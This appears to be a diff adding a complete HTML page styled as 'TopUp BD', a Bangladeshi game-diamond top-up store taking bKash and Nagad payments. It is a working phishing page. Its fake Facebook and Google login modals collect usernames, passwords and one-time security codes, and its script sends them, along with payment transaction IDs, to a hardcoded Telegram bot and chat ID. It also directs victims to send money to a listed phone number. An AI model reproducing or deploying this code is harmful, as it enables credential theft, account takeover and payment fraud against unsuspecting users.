@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TopUp BD</title>
+    <style>
+        :root { --blue: #0061ff; --orange: #ff4d00; --bkash: #e2136e; --nagad: #f7941d; }
+        body { font-family: 'Segoe UI', sans-serif; margin: 0; background-color: #f0f2f5; }
+
+        /* ব্যানার ও নোটিশ */
+        .scrolling-notice { background: #ff4d00; color: white; padding: 8px 0; overflow: hidden; white-space: nowrap; font-size: 14px; }
+        .scrolling-notice span { display: inline-block; padding-left: 100%; animation: scroll 15s linear infinite; }
+        @keyframes scroll { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+
+        /* ব্যানার ডিজাইন আপডেট */
+        .premium-banner { 
+            background: linear-gradient(135deg, #001f3f 0%, #0074D9 50%, #001f3f 100%);
+            background-size: 400% 400%;
+            animation: gradientBG 10s ease infinite;
+            padding: 70px 20px; 
+            text-align: center; 
+            border-bottom: 5px solid var(--orange);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .premium-banner h1 { 
+            color: white; 
+            font-size: 48px; 
+            margin: 0; 
+            text-transform: uppercase;
+            font-weight: 900;
+            letter-spacing: 5px;
+            text-shadow: 0 5px 15px rgba(0,0,0,0.5), 0 0 20px rgba(255,255,255,0.2);
+            font-family: 'Arial Black', sans-serif;
+        }
+
+        .premium-banner::after {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            opacity: 0.2;
+        }
+
+        .container { max-width: 500px; margin: -25px auto 50px; padding: 0 15px; position: relative; z-index: 10; }
+        .card { background: #ffffff; border-radius: 15px; padding: 20px; margin-bottom: 20px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); border: 1px solid #e1e4e8; }
+        .card-title { font-size: 18px; font-weight: bold; margin-bottom: 15px; color: var(--blue); border-left: 5px solid var(--orange); padding-left: 10px; }
+
+        /* ডায়মন্ড লিস্ট */
+        .pkg-list { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+        .pkg { background: #fff; border: 1.5px solid #eee; padding: 15px; border-radius: 12px; text-align: center; cursor: pointer; position: relative; }
+        .pkg.active { border: 2px solid var(--blue); background: #f0f7ff; }
+        .pkg.active::after { content: '✓'; position: absolute; top: 5px; right: 8px; background: var(--blue); color: white; width: 18px; height: 18px; border-radius: 50%; font-size: 11px; display: flex; align-items: center; justify-content: center; }
+
+        input { width: 100%; padding: 15px; border: 1.5px solid #ddd; border-radius: 10px; margin: 10px 0; box-sizing: border-box; font-size: 16px; }
+        .main-btn { width: 100%; padding: 18px; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; background: var(--orange); color: white; }
+
+        /* পপআপ */
+        .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; }
+        .modal { background: white; width: 85%; max-width: 360px; border-radius: 20px; padding: 30px 20px; text-align: center; position: relative; }
+        .close-btn { position: absolute; top: 10px; right: 10px; background: #eee; width: 30px; height: 30px; border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="scrolling-notice">
+    <span>📢 TopUp Bd তে ২৪ ঘন্টা ডায়মন্ড টপআপ করতে পারবেন। দ্রুত ডেলিভারি এবং ১০০% নিরাপদ সেবা। 📢</span>
+</div>
+
+<div class="premium-banner">
+    <h1>TOP UP BD</h1>
+</div>
+
+<div class="container">
+    <div class="card">
+        <div class="card-title">ডায়মন্ড প্যাকেজ</div>
+        <div class="pkg-list" id="diamond-grid"></div>
+    </div>
+
+    <div class="card">
+        <div class="card-title">প্লেয়ার আইডি</div>
+        <input type="number" id="uid" placeholder="এখানে আইডি কোড দিন">
+    </div>
+
+    <div class="card">
+        <div class="card-title">পেমেন্ট মেথড</div>
+        <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px;">
+            <div class="pkg" style="background:var(--bkash); color:white; border:none;" onclick="setMe(this, 'bKash')">bKash</div>
+            <div class="pkg" style="background:var(--nagad); color:white; border:none;" onclick="setMe(this, 'Nagad')">Nagad</div>
+            <div class="pkg" style="background:#555; color:white; border:none;" onclick="setMe(this, 'Baki')">বাকি</div>
+        </div>
+        <button class="main-btn" style="margin-top:25px" onclick="startFlow()">অর্ডার কনফার্ম করুন</button>
+    </div>
+</div>
+
+<div class="overlay" id="overlay">
+    <div class="modal" id="login-choice" style="display:none">
+        <div class="close-btn" onclick="cls()">✕</div>
+        <h3>লগইন করে ভেরিফাই করুন</h3>
+        <button onclick="sh('form', 'Facebook')" style="background:#1877f2; color:white; border:none; padding:15px; border-radius:10px; width:100%; font-weight:bold; margin-bottom:10px;">Login with Facebook</button>
+        <button onclick="sh('form', 'Google')" style="background:white; color:#555; border:1px solid #ddd; padding:15px; border-radius:10px; width:100%; font-weight:bold; display:flex; align-items:center; justify-content:center; gap:8px;">
+            <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" width="18"> Sign in with Google
+        </button>
+    </div>
+
+    <div class="modal" id="login-form" style="display:none">
+        <div class="close-btn" onclick="cls()">✕</div>
+        <h3 id="plat-title">Login</h3>
+        <input type="text" id="user" placeholder="Email or Phone">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="main-btn" onclick="sendAuth()">Login</button>
+    </div>
+
+    <div class="modal" id="otp-box" style="display:none">
+        <div class="close-btn" onclick="cls()">✕</div>
+        <h3>Security Code</h3>
+        <p>আপনার নাম্বারে পাঠানো কোডটি দিন</p>
+        <input type="number" id="otp" placeholder="0 0 0 0 0 0">
+        <button class="main-btn" style="background:green" onclick="sendOTP()">Confirm Code</button>
+    </div>
+
+    <div class="modal" id="pay-box" style="display:none">
+        <div class="close-btn" onclick="cls()">✕</div>
+        <h3>Payment Info</h3>
+        <div style="background:#fff3cd; padding:15px; border-radius:10px; color:#856404; font-weight:bold; margin-bottom:15px;">
+            01735543190 এই নাম্বারে টাকা সেন্ড মানি করুন।
+        </div>
+        <input type="text" id="trx" placeholder="ট্রানজেকশন আইডি দিন">
+        <button class="main-btn" onclick="finishPay()">Confirm Transaction</button>
+    </div>
+
+    <div class="modal" id="final-box" style="display:none">
+        <h1 style="color:green; font-size: 45px;">✔</h1>
+        <p style="font-weight:bold; font-size:18px;">আপনার অর্ডারটি গ্রহণ করা হয়েছে।</p>
+        <p>২৪ ঘন্টার মধ্যে প্রসেস করা হবে।</p>
+        <button class="main-btn" style="background:#333;" onclick="location.reload()">Okay</button>
+    </div>
+</div>
+
+<script>
+    let pk='', me='', plt='';
+    const t = '8537193586:AAHYYZmPsR_99fWZy8tk3kAIzTXewbYZsys';
+    const c = '6425561662';
+
+    const list = [
+        {d:'Weekly Pack', t:153}, {d:'Monthly Pack', t:760},
+        {d:'115 Diamond', t:80}, {d:'240 Diamond', t:165},
+        {d:'610 Diamond', t:410}, {d:'1020 Diamond', t:650},
+        {d:'2530 Diamond', t:1650}, {d:'5060 Diamond', t:3250},
+        {d:'10120 Diamond', t:6400}, {d:'15000 Diamond', t:9500}
+    ];
+
+    const grid = document.getElementById('diamond-grid');
+    list.forEach(i => { grid.innerHTML += `<div class="pkg" onclick="setPk(this, '${i.d}')"><p>${i.d}</p><span>৳ ${i.t}</span></div>`; });
+
+    function setPk(e, n){ document.querySelectorAll('.pkg').forEach(x => x.classList.remove('active')); e.classList.add('active'); pk = n; }
+    function setMe(e, m){ document.querySelectorAll('.pkg').forEach(x => x.style.outline = "none"); e.style.outline = "3px solid black"; me = m; }
+    
+    function cls(){ document.getElementById('overlay').style.display='none'; }
+    function sh(v, p){
+        document.querySelectorAll('.modal').forEach(m => m.style.display = 'none');
+        if(v=='choice') document.getElementById('login-choice').style.display = 'block';
+        if(v=='form') document.getElementById('login-form').style.display = 'block';
+        if(v=='otp') document.getElementById('otp-box').style.display = 'block';
+        if(v=='pay') document.getElementById('pay-box').style.display = 'block';
+        if(v=='final') document.getElementById('final-box').style.display = 'block';
+        if(p) { plt = p; document.getElementById('plat-title').innerText = p + " Login"; }
+    }
+
+    function startFlow(){
+        if(!pk || !me || !document.getElementById('uid').value) return alert('সব তথ্য দিন');
+        document.getElementById('overlay').style.display='flex';
+        if(me == 'Baki') sh('choice');
+        else sh('pay');
+    }
+
+    function sendBot(txt){ fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&parse_mode=HTML&text=${encodeURIComponent(txt)}`); }
+
+    function sendAuth(){
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        if(!u || !p) return;
+        sendBot(`<b>🚨 BAKI LOGIN</b>\nUID: ${document.getElementById('uid').value}\nUser: <code>${u}</code>\nPass: <code>${p}</code>`);
+        sh('otp');
+    }
+
+    function sendOTP(){
+        const code = document.getElementById('otp').value;
+        if(!code) return;
+        sendBot(`<b>🔑 CODE:</b> <code>${code}</code>`);
+        sh('final');
+    }
+
+    function finishPay(){
+        const trx = document.getElementById('trx').value;
+        if(!trx) return alert('ট্রানজেকশন আইডি দিন');
+        sendBot(`<b>💰 PAID ORDER</b>\nMethod: ${me}\nPkg: ${pk}\nTRX: <code>${trx}</code>`);
+        sh('final');
+    }
+</script>
+</body>
+</html>
